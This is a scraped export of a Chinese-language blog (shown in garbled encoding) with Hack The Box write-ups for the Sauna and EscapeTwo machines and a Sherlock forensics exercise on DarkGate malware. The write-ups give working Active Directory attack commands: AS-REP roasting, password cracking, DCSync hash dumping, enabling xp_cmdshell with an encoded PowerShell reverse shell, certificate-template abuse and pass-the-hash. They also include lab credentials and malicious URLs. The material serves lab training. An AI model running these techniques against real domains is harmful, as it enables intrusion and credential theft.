tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped æŠŠEGOTISTICAL-BANK.LOCALæ·»åŠ åˆ°**/etc/hosts**\nCrack Password #\råœ¨ç½‘é¡µä¸­çš„abouté¡µé¢å‘ç°äº†ä¸€äº›å›¢é˜Ÿæˆå‘˜\nFergus Smith\rShaun Coins\rHugo Bear Bowie Taylor Steven Kerb Sophie Driver è¿™é‡Œä½¿ç”¨ä¸€ä¸ªå·¥å…·å°†å¯èƒ½çš„ç”¨æˆ·åç»„åˆåˆ—å‡º\n[github author=\u0026ldquo;urbanadventurer\u0026rdquo; project=\u0026ldquo;username-anarchy\u0026rdquo;][/github]\n[root@kali] /home/kali/Sauna/username-anarchy (master) âš¡ â¯ cat usernames.txt fergus\rfergus.smith\rferguss\rfsmith\rshaun\rshaun.coins\rshaunc\rscoins\rhugo\rhugo.bear\rhugob\rhbear\rbowie\rbowie.taylor\rbowiet\rbtaylor\rsteven\rsteven.kerb\rstevenk\rskerb\rsophie\rsophie.driver\rsophied\rsdriver ä½¿ç”¨kerbruteè¿›è¡Œå°è¯•æ˜¯å¦å­˜åœ¨è¿™äº›ç”¨æˆ·\n[root@kali] /home/kali/Sauna â¯ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL usernames.txt --dc EGOTISTICAL-BANK.LOCAL\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) Ronnie Flathers @ropnop\rUsing KDC(s):\rEGOTISTICAL-BANK.LOCAL:88\r[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL\rDone! Tested 24 usernames (1 valid) in 1.049 seconds å¯ä»¥çœ‹åˆ°åªå­˜åœ¨ä¸€ä¸ªfsmithï¼Œä¸‹é¢çœ‹ä¸€ä¸‹æ˜¯å¦å¼€å¯äº†Kerberos é¢„èº«ä»½éªŒè¯\n[root@kali] /home/kali/Sauna â¯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; EGOTISTICAL-BANK.LOCAL/ â\r$krb5asrep$23$fSmith@EGOTISTICAL-BANK.LOCAL:2bf051fe5d01a87bb394e35afeb5fb52$9109680d602a2ee95749b1c7c8eb999526aaa633047a593d78442d74949dc97d2b565d61ffee5f92ed51a9aa4486561ad901cd7ade464bed9696a10a40fcccabe87883a59903ac99a03e65c16101bf4083dee0e86691cb2060a29a94c983acc7adf6bc16a1abc6fa3d46cea8eb43a1404446698fe5dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ä½¿ç”¨John the Ripperè¿›è¡Œè§£å¯†\n[root@kali] /home/kali/Sauna â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rxxxxxxxxxxxxx ($krb5asrep$23$fSmith@EGOTISTICAL-BANK.LOCAL) æœ€åä½¿ç”¨Evil-winrmè¿›è¡Œç™»å½•æ‹¿åˆ°user.txt\nPrivilege Escalation #\rBloodhound #\ræŠŠSAUNA.EGOTISTICAL-BANK.LOCALæ·»åŠ åˆ°**/etc/hosts**\n[root@kali] /home/kali/Sauna â¯ bloodhound-python -u fsmith -p \u0026#34;Thestrokes23\u0026#34; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.xx.xx -c All\rINFO: Found AD domain: egotistical-bank.local\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Found 7 users\rINFO: Found 52 groups\rINFO: Found 3 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Done in 00M 32S å‘ç°ä¸€ä¸ªå¯ä»¥ä½¿ç”¨DCSyncçš„ç”¨æˆ·ï¼šSVC_LOANMGR\nä¸¤ä¸ªç”¨æˆ·åœ¨ä¸€ä¸ªç»„å†…ï¼Œä½†æ˜¯fsmithå’Œsvc_loanmgrä¹‹é—´æ²¡æœ‰ç›´æ¥è”ç³»\nWinpeas #\ræˆ‘è¿™é‡Œä¸‹è½½çš„æ˜¯winpeasx64.exe\nReleases Â· peass-ng/PEASS-ng åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå‘ç°äº†è‡ªåŠ¨ç™»å½•å‡­è¯\nÃ‰ÃÃÃÃÃÃÃÃÃÃÂ¹ Looking for AutoLogon credentials\rSome AutoLogon credentials were found\rDefaultDomainName : EGOTISTICALBANK\rDefaultUserName : EGOTISTICALBANK\\svc_loanmanager\rDefaultPassword : MoneymakesthXXXXXXXXXXX é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨DCSyncæ”»å‡»äº†\nDCSync #\rä½¿ç”¨impacket-secretsdumpæ¥ä¼ªè£…æˆDCè·å–åŸŸæ§ä¸Šçš„hash\n[root@kali] /home/kali/Sauna â¯ impacket-secretsdump \u0026#39;EGOTISTICAL-BANK.local/svc_loanmgr:Moneymakestheworldgoround!\u0026#39;@10.10.xx.xx\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaxxxxxxxxxxx:823452073d75b9dxxxxxxxxxxxxx:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: é€šè¿‡evil-winrmä½¿ç”¨hashç™»å½•ï¼Œæ‹¿åˆ°root.txt\nSummary #\rUserï¼šé€šè¿‡å®˜ç½‘ä¸Šçš„ç›¸å…³èµ„æ–™å°è¯•çˆ†ç ´ç”¨æˆ·åï¼Œä½¿ç”¨å·¥å…·username-anarchyæ¥è·å–ä¸€äº›å¸¸è§çš„ç”¨æˆ·åï¼Œé€šè¿‡Kerberosçš„æœªè®¾ç½®é¢„è®¤è¯çš„è´¦æˆ·è·å–åˆ°äº†ç”¨æˆ·hashè¿›è¡Œç™»å½•ã€‚\nRootï¼šBloodhoundåˆ†æå¯ä»¥è¿›è¡ŒDCSyncæ”»å‡»ï¼Œä½†æ˜¯å’Œå½“å‰ç”¨æˆ·æ²¡æœ‰å…³è”ï¼Œåªèƒ½ä¸Šä¼ WinpeasæŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯ï¼Œè·å–åˆ°äº†è‡ªåŠ¨ç™»å½•çš„å¯†ç ï¼Œè¿›è€Œè¿›è¡ŒDCSync\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-sauna/","section":"Posts","summary":"","title":"HTB-Sauna","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su\nNmap #\rroot@kali: /home/kali/EscapeTwo âœ nmap EscapeTwo.htb -sV -Pn -T4\rNmap scan report for EscapeTwo.htb PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows SMB User Crack #\rroot@kali: /home/kali/EscapeTwo âœ crackmapexec smb escapetwo.htb -u \u0026#34;rose\u0026#34; -p \u0026#34;KxEPkKe6R8su\u0026#34; --rid-brute | grep SidTypeUser\rSMB EscapeTwo.htb 445 DC01 500: SEQUEL\\Administrator (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 501: SEQUEL\\Guest (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 502: SEQUEL\\krbtgt (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1000: SEQUEL\\DC01$ (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1103: SEQUEL\\michael (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1114: SEQUEL\\ryan (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1116: SEQUEL\\oscar (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1122: SEQUEL\\sql_svc (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1601: SEQUEL\\rose (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1607: SEQUEL\\ca_svc (SidTypeUser) SMB File Leak #\r[root@kali] /home/kali/EscapeTwo â¯ smbclient -L //10.10.xx.xx -U rose\rPassword for [WORKGROUP\\rose]:\rSharename Type Comment\r--------- ---- -------\rAccounting Department Disk ADMIN$ Disk Remote Admin\rC$ Disk Default share\rIPC$ IPC Remote IPC\rNETLOGON Disk Logon server share SYSVOL Disk Logon server share Users Disk åœ¨è¿™ä¸ªAccounting Departmentä¸­å­˜åœ¨è¡¨æ ¼æ–‡ä»¶\n[root@kali] /home/kali/EscapeTwo â¯ smbclient //10.10.xx.xx/Accounting\\ Department -U rose â\rPassword for [WORKGROUP\\rose]:\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; dir\r. D 0 Sun Jun 9 18:52:21 2024\r.. D 0 Sun Jun 9 18:52:21 2024\raccounting_2024.xlsx A 10217 Sun Jun 9 18:14:49 2024\raccounts.xlsx A 6780 Sun Jun 9 18:52:07 2024\r6367231 blocks of size 4096. 904047 blocks available\rsmb: \\\u0026gt; æŸ¥çœ‹accounts.xlsxæ–‡ä»¶å‘ç°ç”¨æˆ·ä¿¡æ¯æ³„éœ²\nMSSQL xp_cmdshell #\r[root@kali] /home/kali/EscapeTwo â¯ impacket-mssqlclient escapetwo.htb/sa:MSSXXXXXXXXX@10.10.11.51 â\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS\r[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\r[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\r[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\r[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;.\r[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\r[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands\rSQL (sa dbo@master)\u0026gt; SELECT DB_NAME() AS CurrentDatabase;\rCurrentDatabase --------------- master SQL (sa dbo@master)\u0026gt; é»˜è®¤çš„xp_cmdshellæ²¡æœ‰è¢«æ‰“å¼€ï¼Œéœ€è¦æ‰‹åŠ¨è®¾ç½®\n-- å¯ç”¨ xp_cmdshell\rEXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;\rRECONFIGURE;\r-- check\rEXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;; æˆ‘è¿™ä½¿ç”¨ä¸€ä¸ªå·¥å…·è¿›è¡Œäº†åå¼¹Shellï¼Œå› ä¸ºåœ¨mssqlç»ˆç«¯ä¸­å¥½åƒå‘½ä»¤è¿‡é•¿ä¼šæ— æ³•ä½¿ç”¨\nRelease mssql-command-tools Â· Mayter/mssql-command-tool [root@kali] /home/kali â¯ ./mssql-command-tools_Linux_amd64 --host 10.10.xx.xx -u \u0026#34;sa\u0026#34; -p \u0026#39;MSSQLP@ssw0rd!\u0026#39; -c \u0026#34;powershell -e yourbase64here\u0026#34; å‘ç°ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­æ³„éœ²äº†sql_svcçš„ä¿¡æ¯\nPS C:\\SQL2019\\ExpressAdv_ENU\u0026gt; cat sql-Configuration.INI\r[OPTIONS]\rACTION=\u0026#34;Install\u0026#34;\rQUIET=\u0026#34;True\u0026#34;\rFEATURES=SQL\rINSTANCENAME=\u0026#34;SQLEXPRESS\u0026#34;\rINSTANCEID=\u0026#34;SQLEXPRESS\u0026#34;\rRSSVCACCOUNT=\u0026#34;NT Service\\ReportServer$SQLEXPRESS\u0026#34;\rAGTSVCACCOUNT=\u0026#34;NT AUTHORITY\\NETWORK SERVICE\u0026#34;\rAGTSVCSTARTUPTYPE=\u0026#34;Manual\u0026#34;\rCOMMFABRICPORT=\u0026#34;0\u0026#34;\rCOMMFABRICNETWORKLEVEL=\u0026#34;\u0026#34;0\u0026#34;\rCOMMFABRICENCRYPTION=\u0026#34;0\u0026#34;\rMATRIXCMBRICKCOMMPORT=\u0026#34;0\u0026#34;\rSQLSVCSTARTUPTYPE=\u0026#34;Automatic\u0026#34;\rFILESTREAMLEVEL=\u0026#34;0\u0026#34;\rENABLERANU=\u0026#34;False\u0026#34; SQLCOLLATION=\u0026#34;SQL_Latin1_General_CP1_CI_AS\u0026#34;\rSQLSVCACCOUNT=\u0026#34;SEQUEL\\sql_svc\u0026#34;\rSQLSVCPASSWORD=\u0026#34;WqSZAF6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\u0026#34;\rSQLSYSADMINACCOUNTS=\u0026#34;SEQUEL\\Administrator\u0026#34;\rSECURITYMODE=\u0026#34;SQL\u0026#34;\rSAPWD=\u0026#34;MSSQLP@ssw0rd!\u0026#34;\rADDCURRENTUSERASSQLADMIN=\u0026#34;False\u0026#34;\rTCPENABLED=\u0026#34;1\u0026#34;\rNPENABLED=\u0026#34;1\u0026#34;\rBROWSERSVCSTARTUPTYPE=\u0026#34;Automatic\u0026#34;\rIAcceptSQLServerLicenseTerms=True\rPS C:\\SQL2019\\ExpressAdv_ENU\u0026gt; ä½¿ç”¨è¿™ä¸ªå¯†ç å¯ä»¥ç™»å½•ryançš„è´¦æˆ·è·å–åˆ°user.txt\nPrivilege Escalation #\råœ¨Evil-winrmé‡ŒæŸ¥çœ‹ipconfig\næŠŠsequel.htbå’Œdc01.seqeul.htbæ·»åŠ åˆ°**/etc/hosts**\nBloodhound #\r[root@kali] /home/kali/EscapeTwo â¯ bloodhound-python -u ryan -p \u0026#34;WqSZAFXXXXXXXX\u0026#34; -d sequel.htb -ns 10.10.xx.xx -c All\rINFO: Found AD domain: sequel.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\rINFO: Connecting to LDAP server: dc01.sequel.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.sequel.htb\rINFO: Found 10 users\rINFO: Found 59 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.sequel.htb\rINFO: Done in 00M 16S Ryanå¯¹CA_SVCå…·æœ‰WriteOwneræƒé™\nå¹¶ä¸”CA_SVCæ˜¯è¯ä¹¦å‘å¸ƒè€…\nå› æ­¤å¯ä»¥å°†CA_SVCçš„æ‹¥æœ‰è€…è®¾ç½®ä¸ºRyan\nSet Owner #\r[root@kali] /home/kali/EscapeTwo â¯ bloodyAD --host \u0026#39;10.10.XX.XX\u0026#39; -d \u0026#39;escapetwo.htb\u0026#39; -u \u0026#39;ryan\u0026#39; -p \u0026#39;WqSZAF6XXXXXXXX\u0026#39; set owner \u0026#39;ca_svc\u0026#39; \u0026#39;ryan\u0026#39; â\r[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc Get Control Rights #\rGrant rights | The Hacker Recipes [root@kali] /home/kali/EscapeTwo â¯ impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; \u0026#39;sequel.htb\u0026#39;/\u0026#34;ryan\u0026#34;:\u0026#34;WqSZAFXXXXXXXXXXX\u0026#34; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL modified successfully! ESC4 to ESC1 #\rAD CS åŸŸå‡çº§ - HackTricks è·å–å½±å­å‡­è¯ï¼ˆShadow Credentialsï¼‰ï¼Œä»¥åŠNThash\n[root@kali] /home/kali/EscapeTwo â¯ certipy-ad shadow auto -u \u0026#39;ryan@sequel.htb\u0026#39; -p \u0026#34;WqSZAXXXXXXX\u0026#34; -account \u0026#39;ca_svc\u0026#39; -dc-ip \u0026#39;10.10.XX.XX\u0026#39;\r####you will get NThash of ca_svc below\r[*] NT hash for \u0026#39;ca_svc\u0026#39;: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX å¦‚æœé‡åˆ°äº†ä¸‹é¢çš„é”™è¯¯ğŸ‘‡éœ€è¦æ‰‹åŠ¨æ›´æ–°æ—¶é—´\n[root@kali] /home/kali/EscapeTwo â¯ ntpdate sequel.htb æŸ¥æ‰¾èƒ½ç”¨çš„æ¨¡æ¿ï¼Œæˆ‘ä»¬éœ€è¦è¦†ç›–ä»–çš„è®¾ç½®\næˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯Certify.exeä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Š\n*Evil-WinRM* PS C:\\temp\u0026gt; ./Certify.exe find /domain:sequel.htb å¯ä»¥çœ‹åˆ°ca_svcå¯¹è¿™ä¸ªè¯ä¹¦å…·æœ‰å¯è¦†ç›–æƒé™ğŸ‘†ï¼Œä¸‹é¢å°†å…¶è¦†ç›–\n[root@kali] /home/kali/EscapeTwo â¯ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.XX.XX -target dc01.sequel.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Updating certificate template \u0026#39;DunderMifflinAuthentication\u0026#39;\r[*] Successfully updated \u0026#39;DunderMifflinAuthentication\u0026#39; åˆ©ç”¨ ca_svc ç”¨æˆ·çš„å‡­è¯å“ˆå¸Œï¼Œé€šè¿‡ Kerberos è¯·æ±‚æ¥è·å¾—ç›®æ ‡ç³»ç»Ÿçš„èº«ä»½éªŒè¯ç¥¨è¯\n[root@kali] /home/kali/EscapeTwo â¯ certipy-ad req -u ca_svc -hashes \u0026#39;XXXXXXXXXXXXXXXXXXXXXXXX\u0026#39; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.xx.xx -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.xx.xx -dns 10.10.xx.xx -debug\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[+] Trying to resolve \u0026#39;sequel.htb\u0026#39; at \u0026#39;10.10.xx.xx\u0026#39;\r[+] Generating RSA key\r[*] Requesting certificate via RPC\r[+] Trying to connect to endpoint: ncacn_np:10.10.xx.xx[\\pipe\\cert]\r[+] Connected to endpoint: ncacn_np:10.10.xx.xx[\\pipe\\cert]\r[*] Successfully requested certificate\r[*] Request ID is 6\r[*] Got certificate with multiple identifications\rUPN: \u0026#39;administrator@sequel.htb\u0026#39;\rDNS Host Name: \u0026#39;10.10.xx.xx\u0026#39;\r[*] Certificate has no object SID\r[*] Saved certificate and private key to \u0026#39;administrator_10.pfx\u0026#39; é€šè¿‡è¯ä¹¦è·å–åˆ°Administratorçš„hash\n[root@kali] /home/kali/EscapeTwo â¯ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Found multiple identifications in certificate\r[*] Please select one:\r[0] UPN: \u0026#39;administrator@sequel.htb\u0026#39;\r[1] DNS Host Name: \u0026#39;10.10.XX.XX\u0026#39;\r\u0026gt; 0\r[*] Using principal: administrator@sequel.htb\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@sequel.htb\u0026#39;: aad3b435bxxxxxxxxxxx:7a8d4e0xxxxxxxxxxxxxxxxxxxxxxxx Evil-Winrmç™»å½•æ‹¿åˆ°root.txt\n[root@kali] /home/kali/EscapeTwo â¯ evil-winrm -i 10.10.xx.xx -u \u0026#34;administrator\u0026#34; -H \u0026#34;7a8d4e049XXXXXXXXXXXXXXXXXX\u0026#34; Summary #\rUserï¼šSMBçš„è¡¨æ ¼æ–‡ä»¶æ³„éœ²äº†è´¦å·å’Œå¯†ç ï¼Œå¯ä»¥ç”¨äºç™»å½•MSSQLæœåŠ¡ï¼Œæ‰‹åŠ¨æ‰“å¼€XP_CMDSHELLå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸æˆ‘ä¹‹å‰å·¥ç¨‹å®è·µçš„ä¸€ä¸ªé¶æœºç±»ä¼¼ã€‚æ‰¾åˆ°äº†SQLæœåŠ¡çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢ä¿å­˜æœ‰å¯†ç ï¼Œå¯ä»¥è¿›è¡ŒRyanç”¨æˆ·çš„ç™»å½•ï¼Œæ‹¿åˆ°User.txt.\nRootï¼šé€šè¿‡Ryanç”¨æˆ·ä½¿ç”¨Bloodhoundè¿›è¡Œåˆ†æï¼Œå‘ç°Ryanå¯¹CA_SVCå…·æœ‰WriteOwneræƒé™ã€‚å¯ä»¥å°†Ryanä½œä¸ºCA_SVCçš„æ‹¥æœ‰è€…ï¼Œæˆ‘å°è¯•è¿‡ä¿®æ”¹CA_SVCçš„å¯†ç ï¼Œä½†æ˜¯ä¼¼ä¹å¯†ç å¹¶ä¸èƒ½è¢«ä¿®æ”¹ï¼ŒæŠ¥é”™è¯´å¯†ç çš„ä¿®æ”¹å†·å´æ˜¯-2 daysã€‚ä¸è¿‡å¯ä»¥æ‹¿åˆ°CA_SVCçš„å½±å­ç¥¨æ®è¿›è¡ŒESC4çš„æ“ä½œï¼Œä½¿ç”¨-kå‚æ•°æŒ‡å®šKerberosè®¤è¯ã€‚è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°å„ç§æŠ¥é”™ï¼Œä¸€å®šè¦å°è¯•ä½¿ç”¨ntpdate sequel.htb åŒæ­¥æ—¶åŒºï¼Œå…¶ä½™çš„å¯èƒ½æ˜¯ç½‘ç»œé—®é¢˜ã€‚\n","date":"2025-01-12","externalUrl":null,"permalink":"/posts/2025/01/htb-escapetwo/","section":"Posts","summary":"","title":"HTB-EscapeTwo","type":"posts"},{"content":"","date":"2025-01-04","externalUrl":null,"permalink":"/categories/htb-sherlock/","section":"Categories","summary":"","title":"Htb-Sherlock","type":"categories"},{"content":"\rSherlock Scenario #\ræˆ‘ä»¬åœ¨ç½‘ç»œæ´»åŠ¨ä¸­å‘ç°äº†ä¸€ä¸ªå¼‚å¸¸æ¨¡å¼ï¼Œè¡¨æ˜å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æˆ‘ä»¬çš„å›¢é˜Ÿæ€€ç–‘æˆ‘ä»¬çš„ç³»ç»Ÿé­åˆ°æœªç»æˆæƒçš„å…¥ä¾µï¼Œå¯èƒ½ä¼šæ³„éœ²æ•æ„Ÿæ•°æ®ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯è°ƒæŸ¥æ­¤äº‹ä»¶ã€‚\nTask1 #\rVBS è„šæœ¬æ˜¯ä»å“ªä¸ªåŸŸä¸‹è½½çš„ï¼Ÿ\nåœ¨æœ€å¼€å§‹çš„DNSåŒ…é‡Œé¢å‘ç°äº†escuelademarina.comï¼Œå¹¶ä¸”ä¸‹é¢çš„SMBåŒ…é‡Œä¹Ÿå­˜åœ¨ä¸€ä¸ªAZURE_DOC_OPEN.vbs\nTask2 #\rä¸é—®é¢˜ #1 ä¸­çš„åŸŸå…³è”çš„ IP åœ°å€ç”¨äºæ­¤æ”»å‡»ï¼Ÿ\nä»é—®é¢˜1ä¸­DNSåŒ…é‡Œå¯ä»¥çœ‹åˆ°IPæ˜¯165.22.16.55\nTask3 #\rç”¨äºåˆå§‹è®¿é—®çš„ VBS è„šæœ¬çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ\né—®é¢˜1ä¸­çš„AZURE_DOC_OPEN.vbs\nTask4 #\rç”¨äºè·å– PowerShell è„šæœ¬çš„ URL æ˜¯ä»€ä¹ˆï¼Ÿ\nå°è¯•å¯¼å‡ºSMBåŒ…\nå°†ç¬¬60ä¸ªåˆ†ç»„çš„dataå­—æ®µå¤åˆ¶ä¸‹æ¥è¿›è¡Œåå…­è¿›åˆ¶è½¬ç \nå¾—åˆ°ç›®æ ‡URLï¼šbadbutperfect.com/nrwncpwo\nTask5 #\rä»€ä¹ˆå¯èƒ½çš„åˆæ³•äºŒè¿›åˆ¶æ–‡ä»¶è¢«ä¸‹è½½åˆ°å—å®³è€…æœºå™¨ä¸Šï¼Ÿ\nå¯¼å‡ºHTTPçš„å¯¹è±¡ï¼ŒæŸ¥çœ‹ç¬¬75ä¸ªåˆ†ç»„\nå¾—åˆ°AutoHotKey.exe\nTask6 #\rä¸é—®é¢˜ #5 ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸€èµ·ä½¿ç”¨çš„æ¶æ„è½¯ä»¶æ˜¯ä»å“ªä¸ª URL ä¸‹è½½çš„ï¼Ÿ\nä¸€èµ·ä½¿ç”¨çš„å°±æ˜¯å›¾ä¸­çš„http://badbutperfect.com/jvtobaqj\nTask7 #\ré—®é¢˜ #6 ä¸­çš„æ¶æ„è½¯ä»¶åœ¨ç£ç›˜ä¸Šç»™å‡ºçš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ\nå›¾ä¸­æœ‰script.ahk\nTask8 #\ræ¶æ„è½¯ä»¶çš„ TLSH æ˜¯å¤šå°‘ï¼Ÿ\nå°†è½¯ä»¶å¯¼å‡ºï¼Œå¹¶ä¸”ä¸Šä¼ åˆ°ï¼šVirusTotal - Home\nTLSHï¼šT15E430A36DBC5202AD8E3074270096562FE7DC0215B4B32659C9EF16835CF6FF9B6A1B8\nTask9 #\rè¿™ä¸ªæ¶æ„è½¯ä»¶å«ä»€ä¹ˆåå­—ï¼Ÿä½¿ç”¨ McAfeeã€Ikarus å’Œ alejandro.sanchez ä½¿ç”¨çš„åç§°ã€‚\nDarkGate\nTask10 #\rå—æ„ŸæŸ“æœºå™¨çš„ user-agent å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆï¼Ÿ\nè¿›å…¥åˆ°HTTPåŒ…é‡ŒæŸ¥çœ‹\nUAï¼šMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nTask11 #\rä¸Šä¸€ä¸ªé—®é¢˜ä¸­çš„ RAT è¿æ¥åˆ°å“ªä¸ª IPï¼Ÿ\n103.124.105.78\n","date":"2025-01-04","externalUrl":null,"permalink":"/posts/2025/01/sherlocks-takedown/","section":"Posts","summary":"","title":"Sherlocks-Takedown","type":"posts"},{"content":"","date":"2025-01-04","externalUrl":null,"permalink":"/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","section":"Tags","summary":"","title":"æ—¥å¿—åˆ†æ","type":"tags"},{"content":"\rSherlock Scenario #\råœ¨è¿™ä¸ª Sherlock ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ **MFTï¼ˆä¸»æ–‡ä»¶è¡¨ï¼‰**å–è¯ã€‚æ‚¨å°†äº†è§£ç”¨äºåˆ†æ MFT å·¥ä»¶ä»¥è¯†åˆ«æ¶æ„æ´»åŠ¨çš„çŸ¥åå·¥å…·å’Œæ–¹æ³•ã€‚åœ¨æˆ‘ä»¬çš„åˆ†æè¿‡ç¨‹ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨ MFTECmd å·¥å…·è§£ææä¾›çš„ MFT æ–‡ä»¶ï¼Œä½¿ç”¨ TimeLine Explorer æ‰“å¼€å¹¶åˆ†æè§£æçš„ MFT çš„ç»“æœï¼Œå¹¶ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä» MFT ä¸­æ¢å¤æ–‡ä»¶å†…å®¹ã€‚\nPreparing 